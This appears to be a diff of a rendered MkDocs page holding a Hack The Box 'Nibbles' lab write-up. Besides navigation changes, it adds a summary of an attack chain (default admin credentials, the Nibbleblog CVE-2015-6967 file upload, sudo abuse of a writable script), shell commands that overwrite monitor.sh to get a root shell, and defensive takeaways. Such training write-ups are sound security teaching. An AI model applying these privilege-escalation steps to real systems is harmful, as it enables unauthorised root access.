@@ -17,6 +17,9 @@
       
       
       
+        <link rel="alternate" type="application/rss+xml" title="RSS feed" href="../../../../../../feed_rss_created.xml">
+        <link rel="alternate" type="application/rss+xml" title="RSS feed of updated content" href="../../../../../../feed_rss_updated.xml">
+      
       <link rel="icon" href="../../../../../../assets/favicon-zero.svg">
       <meta name="generator" content="mkdocs-1.6.1, mkdocs-material-9.6.20">
     
@@ -72,6 +75,11 @@
     <input class="md-toggle" data-md-toggle="search" type="checkbox" id="__search" autocomplete="off">
     <label class="md-overlay" for="__drawer"></label>
     <div data-md-component="skip">
+      
+        
+        <a href="#takeaway" class="md-skip">
+          Skip to content
+        </a>
       
     </div>
     <div data-md-component="announce">
@@ -192,13 +200,13 @@
   
   
     <li class="md-tabs__item">
-      <a href="/#write-ups" class="md-tabs__link">
+      <a href="/#blog" class="md-tabs__link">
         
   
   
     
   
-  Write-ups
+  Blog
 
       </a>
     </li>
@@ -218,6 +226,25 @@
     
   
   CVEs
+
+      </a>
+    </li>
+  
+
+      
+        
+  
+  
+  
+  
+    <li class="md-tabs__item">
+      <a href="/#write-ups" class="md-tabs__link">
+        
+  
+  
+    
+  
+  Write-ups
 
       </a>
     </li>
@@ -310,12 +337,12 @@
   
   
     <li class="md-nav__item">
-      <a href="/#write-ups" class="md-nav__link">
+      <a href="/#blog" class="md-nav__link">
         
   
   
   <span class="md-ellipsis">
-    Write-ups
+    Blog
     
   </span>
   
@@ -338,6 +365,28 @@
   
   <span class="md-ellipsis">
     CVEs
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+    
+      
+      
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="/#write-ups" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    Write-ups
     
   </span>
   
@@ -387,6 +436,23 @@
   
   
   
+    <label class="md-nav__title" for="__toc">
+      <span class="md-nav__icon md-icon"></span>
+      Table of contents
+    </label>
+    <ul class="md-nav__list" data-md-component="toc" data-md-scrollfix>
+      
+        <li class="md-nav__item">
+  <a href="#takeaway" class="md-nav__link">
+    <span class="md-ellipsis">
+      Takeaway
+    </span>
+  </a>
+  
+</li>
+      
+    </ul>
+  
 </nav>
                   </div>
                 </div>
@@ -406,11 +472,21 @@
 <p><img alt="Nibbles" src="../img/Nibbles_0001.png" /></p>
 <p>Machine: <a href="https://app.hackthebox.com/machines/Nibbles">Nibbles</a>:
 Easy . Linux</p>
+<p>In this easy Linux machine, we go from an outdated Nibbleblog install to root. Default admin
+credentials get us into the dashboard, a known arbitrary-file-upload bug (CVE-2015-6967) turns
+that access into remote code execution, and a <code>sudo</code> rule over a writable script hands us root.
+You will learn how to:</p>
+<ul>
+<li>Enumerate a web application and read exposed configuration and user files</li>
+<li>Log into an admin panel using default credentials</li>
+<li>Exploit the Nibbleblog 4.0.3 arbitrary file upload (CVE-2015-6967) for RCE</li>
+<li>Escalate to root by abusing a <code>sudo</code> rule over a writable script</li>
+</ul>
 <hr />
 <p>Tags: #nibbleblog #arbitrary-file-upload #misconfiguration-abuse</p>
 <hr />
 <p><strong>Vulnerabilities:</strong></p>
-<p>Weak Credentials - Default Admin Dashboard Logins (admin:<PASSWORD>&gt;)
+<p>Weak Credentials - Default Admin Dashboard Login (admin:<PASSWORD>)
 Arbitrary File Upload - Nibbleblog 4.0.3 "My Image" Plugin Exploit (RCE)
 Sudo Misconfiguration - Writeable Script Execution Allowed as Root (Privesc to root)</p>
 <hr />
@@ -543,12 +619,14 @@ Sudo Misconfiguration - Writeable Script Execution Allowed as Root (Privesc to r
 <a id="__codelineno-11-8" name="__codelineno-11-8" href="#__codelineno-11-8"></a><span class="w">   </span>creating:<span class="w"> </span>personal/stuff/
 <a id="__codelineno-11-9" name="__codelineno-11-9" href="#__codelineno-11-9"></a><span class="w">  </span>inflating:<span class="w"> </span>personal/stuff/monitor.sh
 </code></pre></div></p>
-<p>We confirmed that we can modify the <code>monitor.sh</code> file
+<p>We confirmed that we could modify the <code>monitor.sh</code> file:
 <div class="highlight"><pre><span></span><code><a id="__codelineno-12-1" name="__codelineno-12-1" href="#__codelineno-12-1"></a>nibbler@Nibbles:/home/nibbler$<span class="w"> </span><span class="nb">cd</span><span class="w"> </span>personal/stuff/
 <a id="__codelineno-12-2" name="__codelineno-12-2" href="#__codelineno-12-2"></a>nibbler@Nibbles:/home/nibbler/personal/stuff$<span class="w"> </span>ls<span class="w"> </span>-l
 <a id="__codelineno-12-3" name="__codelineno-12-3" href="#__codelineno-12-3"></a>total<span class="w"> </span><span class="m">4</span>
 <a id="__codelineno-12-4" name="__codelineno-12-4" href="#__codelineno-12-4"></a>-rwxrwxrwx<span class="w"> </span><span class="m">1</span><span class="w"> </span>nibbler<span class="w"> </span>nibbler<span class="w"> </span><span class="m">4015</span><span class="w"> </span>May<span class="w">  </span><span class="m">8</span><span class="w">  </span><span class="m">2015</span><span class="w"> </span>monitor.sh
 </code></pre></div></p>
+<p>Because <code>monitor.sh</code> is world-writable (<code>-rwxrwxrwx</code>) and the <code>sudo</code> rule lets us run it as root
+without a password, overwriting it with our own commands gives us root execution.</p>
 <p>We replaced the contents of <code>monitor.sh</code> with a shell script:
 <div class="highlight"><pre><span></span><code><a id="__codelineno-13-1" name="__codelineno-13-1" href="#__codelineno-13-1"></a>nibbler@Nibbles:/home/nibbler/personal/stuff$<span class="w"> </span><span class="nb">echo</span><span class="w"> </span><span class="s1">'#!/bin/bash'</span><span class="w"> </span>&gt;<span class="w"> </span>monitor.sh
 <a id="__codelineno-13-2" name="__codelineno-13-2" href="#__codelineno-13-2"></a>nibbler@Nibbles:/home/nibbler/personal/stuff$<span class="w"> </span><span class="nb">echo</span><span class="w"> </span><span class="s1">'/bin/bash -i'</span><span class="w"> </span>&gt;&gt;<span class="w"> </span>monitor.sh
@@ -563,6 +641,13 @@ Sudo Misconfiguration - Writeable Script Execution Allowed as Root (Privesc to r
 <div class="highlight"><pre><span></span><code><a id="__codelineno-15-1" name="__codelineno-15-1" href="#__codelineno-15-1"></a>root@Nibbles:/home/nibbler/personal/stuff#<span class="w"> </span>cat<span class="w"> </span>/root/root.txt
 <a id="__codelineno-15-2" name="__codelineno-15-2" href="#__codelineno-15-2"></a>&lt;ROOT_FLAG&gt;
 </code></pre></div></p>
+<hr />
+<h2 id="takeaway">Takeaway</h2>
+<ul>
+<li><strong>Patch, and never ship defaults.</strong> Nibbleblog 4.0.3 is years out of date, and the admin panel used default credentials — fixing either one alone would have broken this chain.</li>
+<li><strong>Lock down <code>sudo</code> targets.</strong> Letting a user run a script as root is only safe if that script isn't writable by that user. Here <code>monitor.sh</code> was world-writable, turning the rule into instant root.</li>
+<li><strong>Don't expose configuration and user files.</strong> A readable <code>users.xml</code> let us confirm the valid <code>admin</code> account before even trying to log in. Sensitive files should sit outside the web root or be denied by the server.</li>
+</ul>
 
 
 
